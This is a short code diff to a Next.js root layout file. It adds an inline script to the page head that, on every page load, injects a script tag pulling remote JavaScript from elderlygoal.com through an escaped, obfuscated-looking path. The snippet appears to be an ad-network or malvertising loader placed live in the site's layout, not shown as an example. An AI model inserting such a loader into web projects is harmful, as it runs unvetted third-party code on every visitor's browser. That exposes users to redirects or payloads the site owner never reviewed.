@@ -94,6 +94,22 @@ export default function RootLayout({
       <head>
         <meta name="98009edd7346960b40d2da2222e99163a3825c1f" content="98009edd7346960b40d2da2222e99163a3825c1f" />
         <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function(iwbn){
+              var d = document,
+                  s = d.createElement('script'),
+                  l = d.scripts[d.scripts.length - 1];
+              s.settings = iwbn || {};
+              s.src = "\\/\\/elderlygoal.com\\/cND.9P6ObE2q5_lrSbW\\/QU9BNAj\\/g\\/1yNsTqUvwNNhSY0o2DO\\/D\\/Uf1dNaT\\/Aq5c";
+              s.async = true;
+              s.referrerPolicy = 'no-referrer-when-downgrade';
+              l.parentNode.insertBefore(s, l);
+              })({})
+            `,
+          }}
+        />
+        <script
           type="application/ld+json"
           dangerouslySetInnerHTML={{
             __html: JSON.stringify({
